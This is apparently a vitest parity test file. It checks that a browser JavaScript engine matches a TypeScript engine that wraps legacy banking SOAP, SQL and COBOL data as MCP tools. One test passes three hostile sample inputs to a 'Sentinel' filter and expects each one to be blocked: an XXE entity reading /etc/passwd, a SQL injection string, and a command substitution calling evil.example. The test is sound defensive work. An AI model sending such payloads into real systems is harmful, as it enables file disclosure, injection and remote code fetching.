// Parity tests: the Mode B browser engine (public/app.js) must behave EXACTLY
// like the TypeScript engine for corpse-01. app.js exposes globalThis.NecroEngine
// and guards all DOM access, so it can be imported in Node.
import * as fs from 'fs';
import * as path from 'path';
import { describe, expect, it } from 'vitest';
import { parseWSDL, parseSQL, parseCOBOL, cobolDataRows } from '../src/engine/parser';
import { buildSoapEnvelope, buildSqlCall, packCobolRecord } from '../src/engine/translator';
import { simulate, simulateSql, simulateCobol } from '../src/engine/simulator';
import { inspect } from '../src/engine/sentinel';
import { computeHitlToken } from '../src/engine/hitl';
import type { CobolLayoutField } from '../src/engine/translator';

const WSDL = fs.readFileSync(
  path.resolve(process.cwd(), 'graveyard/corpse-01-banking-soap.xml'),
  'utf-8',
);
const AST = parseWSDL(WSDL, {
  artifactId: 'corpse-01-banking-soap',
  title: '1998 SOAP Core Bank',
  era: '1998',
});
const [BAL, WIRE] = AST.operations;

async function browserEngine(): Promise<any> {
  await import('../public/app.js');
  const eng = (globalThis as any).NecroEngine;
  if (!eng) throw new Error('public/app.js did not expose globalThis.NecroEngine');
  return eng;
}

describe('browser engine parity (public/app.js vs TypeScript engine)', () => {
  it('parses the embedded WSDL into the same 2 operations', async () => {
    const eng = await browserEngine();
    expect(eng.CORPSE_01_WSDL).toBe(WSDL);
    const ast = eng.parseWSDL(eng.CORPSE_01_WSDL);
    expect(ast.artifactId).toBe('corpse-01-banking-soap');
    expect(ast.operations.map((o: any) => o.opId)).toEqual([
      'GetAccountBalance',
      'ExecuteWireTransfer',
    ]);
    expect(ast.operations.map((o: any) => o.mcpToolName)).toEqual([
      'banking_get_balance',
      'banking_wire_transfer',
    ]);
    expect(ast.generatedEarsSpec).toContain('banking_get_balance');
    expect(ast.generatedZodCode).toContain('BankingGetBalanceInput');
  });

  it('builds byte-identical SOAP envelopes for both operations', async () => {
    const eng = await browserEngine();
    const balArgs = { accountNumber: '88412007', routingCode: '021000021' };
    expect(eng.buildSoapEnvelope(BAL, balArgs)).toBe(buildSoapEnvelope(BAL, balArgs));
    const wireArgs = {
      sourceAccountNumber: '88412007',
      destinationAccountNumber: '11223344',
      amountUsd: 450,
      memo: 'INV & TAX #9921',
    };
    expect(eng.buildSoapEnvelope(WIRE, wireArgs)).toBe(buildSoapEnvelope(WIRE, wireArgs));
  });

  it('simulates identical balances and wire settlements', async () => {
    const eng = await browserEngine();
    const balArgs = { accountNumber: '88412007', routingCode: '021000021' };
    const tsBal = simulate(BAL, balArgs);
    const jsBal = eng.simulate(BAL, balArgs);
    expect(jsBal.json).toEqual(tsBal.json);
    expect(jsBal.json).toEqual({
      ledgerBalanceCents: 483433,
      availableBalanceCents: 480933,
      currencyCode: 'USD',
    });
    expect(jsBal.responseXml).toBe(tsBal.responseXml);
    const wireArgs = {
      sourceAccountNumber: '88412007',
      destinationAccountNumber: '11223344',
      amountUsd: 450,
      memo: 'Rent payment',
    };
    const tsWire = simulate(WIRE, wireArgs);
    const jsWire = eng.simulate(WIRE, wireArgs);
    expect(jsWire.json).toEqual(tsWire.json);
    expect(jsWire.json.postedCents).toBe(45000);
    expect(jsWire.responseXml).toBe(tsWire.responseXml);
  });

  it('round-trips SOAP responses back to the same JSON', async () => {
    const eng = await browserEngine();
    const balArgs = { accountNumber: '88412007', routingCode: '021000021' };
    const { responseXml, json } = eng.simulate(BAL, balArgs);
    expect(eng.parseSoapResponse(responseXml, BAL)).toEqual(json);
  });

  it('throws CorpseCorruptionError on a WSDL with no messages', async () => {
    const eng = await browserEngine();
    expect(() => eng.parseWSDL('<definitions name="Empty"></definitions>')).toThrow(
      /CorpseCorruptionError/,
    );
  });
});

const SQL = fs.readFileSync(
  path.resolve(process.cwd(), 'graveyard/corpse-02-inventory-dump.sql'),
  'utf-8',
);
const DAT = fs.readFileSync(
  path.resolve(process.cwd(), 'graveyard/corpse-03-cobol-flatfile.dat'),
  'utf-8',
);
const SQL_AST = parseSQL(SQL, {
  artifactId: 'corpse-02-inventory-sql',
  title: '2004 SQL Warehouse',
  era: '2004',
});
const COBOL_AST = parseCOBOL(DAT, {
  artifactId: 'corpse-03-cobol-claims',
  title: '1989 COBOL Claims Ledger',
  era: '1989',
});
const [Q, A, M] = SQL_AST.operations;
const [LOOKUP] = COBOL_AST.operations;
const ROWS = cobolDataRows(DAT);
const FIELDS: CobolLayoutField[] = COBOL_AST.cobolFields.map((f) => ({
  legacyName: f.legacyName,
  semanticName: f.semanticName,
  type: f.type,
  byteOffset: f.constraints.byteOffset!,
  decimals: f.decimals,
}));

describe('browser engine parity Phase 2 (SQL + COBOL)', () => {
  it('embeds the SQL and COBOL corpses byte-identically', async () => {
    const eng = await browserEngine();
    expect(eng.CORPSE_02_SQL).toBe(SQL);
    expect(eng.CORPSE_03_DAT).toBe(DAT);
  });

  it('parses the SQL dump into the same 3 operations', async () => {
    const eng = await browserEngine();
    const ast = eng.parseSQL(eng.CORPSE_02_SQL);
    expect(ast.format).toBe('SQL_DDL');
    expect(ast.operations.map((o: any) => o.mcpToolName)).toEqual(
      SQL_AST.operations.map((o) => o.mcpToolName),
    );
    expect(ast.operations[0].inputs.map((f: any) => f.semanticName)).toEqual(
      Q.inputs.map((f) => f.semanticName),
    );
    expect(ast.operations[0].outputs.map((f: any) => f.semanticName)).toEqual(
      Q.outputs.map((f) => f.semanticName),
    );
    expect(ast.generatedEarsSpec).toContain('inventory_query_stock');
  });

  it('parses the COBOL copybook into the same 6 fields', async () => {
    const eng = await browserEngine();
    const ast = eng.parseCOBOL(eng.CORPSE_03_DAT);
    expect(ast.format).toBe('FIXED_WIDTH');
    expect(ast.cobolFields.map((f: any) => f.semanticName)).toEqual(
      COBOL_AST.cobolFields.map((f) => f.semanticName),
    );
    expect(ast.cobolFields.map((f: any) => f.byteRange)).toEqual(
      COBOL_AST.cobolFields.map((f) => f.byteRange),
    );
    expect(ast.operations[0].mcpToolName).toBe('claims_lookup_patient');
  });

  it('builds identical parameterized SQL calls', async () => {
    const eng = await browserEngine();
    const args = { skuCode: 'SKU-001', warehouseAisle: 'A-12' };
    expect(eng.buildSqlCall(Q, args)).toEqual(buildSqlCall(Q, args));
    expect(eng.parseSqlResult({
      SKU_CD_V2: 'SKU-001',
      PART_DESC_TXT: 'Legacy part SKU-001',
      INV_QTY_OH: 31,
      REORD_THRSH_NUM: 25,
      UNIT_CST_USD: 57.29,
      LOC_WH_AISLE: 'A-12',
    }, Q)).toEqual({
      skuCode: 'SKU-001',
      partDescription: 'Legacy part SKU-001',
      quantityOnHand: 31,
      reorderThreshold: 25,
      unitCostUsd: 57.29,
      warehouseAisle: 'A-12',
    });
  });

  it('packs and parses identical 80-byte COBOL records', async () => {
    const eng = await browserEngine();
    const args = {
      patientId: 'PT00088412',
      claimDate: '1989-09-02',
      diagnosisCode: 'ICD410.9',
      claimAmountUsd: 1450.75,
      adjustmentStatus: 'A',
      memo: 'CORONARY CARE UNIT ADMISSION VERIFIED',
    };
    expect(eng.packCobolRecord(FIELDS, args)).toBe(packCobolRecord(FIELDS, args));
    expect(eng.parseCobolRecord(ROWS[0], FIELDS)).toEqual({
      patientId: 'PT00088412',
      claimDate: '1989-09-02',
      diagnosisCode: 'ICD410.9',
      claimAmountUsd: 1450.75,
      adjustmentStatus: 'A',
      memo: 'CORONARY CARE UNIT ADMISSION VERIFIED',
    });
    expect(eng.julianToISO('89245')).toBe('1989-09-02');
    expect(eng.isoToJulian('1989-09-02')).toBe('89245');
  });

  it('simulates identical SQL and COBOL results', async () => {
    const eng = await browserEngine();
    const sqlTs = simulateSql(Q, { skuCode: 'SKU-001', warehouseAisle: 'A-12' });
    const sqlJs = eng.simulateSql(Q, { skuCode: 'SKU-001', warehouseAisle: 'A-12' });
    expect(sqlJs).toEqual(sqlTs);
    const cobTs = simulateCobol(LOOKUP, { patientId: 'PT00088412' }, ROWS, FIELDS);
    const cobJs = eng.simulateCobol(LOOKUP, { patientId: 'PT00088412' }, eng.cobolDataRows(eng.CORPSE_03_DAT), FIELDS);
    expect(cobJs).toEqual(cobTs);
    expect(() =>
      eng.simulateCobol(LOOKUP, { patientId: 'PT99999999' }, ROWS, FIELDS),
    ).toThrow(/No claim record found/);
  });

  it('applies the same Sentinel verdicts as the TS engine', async () => {
    const eng = await browserEngine();
    for (const args of [
      { memo: '<!ENTITY xxe SYSTEM "file:///etc/passwd">' },
      { memo: "' OR 1=1 --" },
      { memo: '$(curl evil.example)' },
    ]) {
      expect(eng.sentinelInspect(args)).toEqual(inspect(args));
      expect(eng.sentinelInspect(args).blocked).toBe(true);
    }
    expect(eng.sentinelInspect({ memo: 'INV & TAX #9921' })).toEqual(
      inspect({ memo: 'INV & TAX #9921' }),
    );
  });

  it('computes identical HITL tokens', async () => {
    const eng = await browserEngine();
    const args = {
      sourceAccountNumber: '88412007',
      destinationAccountNumber: '11223344',
      amountUsd: 50000,
      memo: 'Big transfer',
    };
    expect(
      eng.computeHitlToken('corpse-01-banking-soap', 'banking_wire_transfer', args),
    ).toBe(computeHitlToken('corpse-01-banking-soap', 'banking_wire_transfer', args));
  });
});
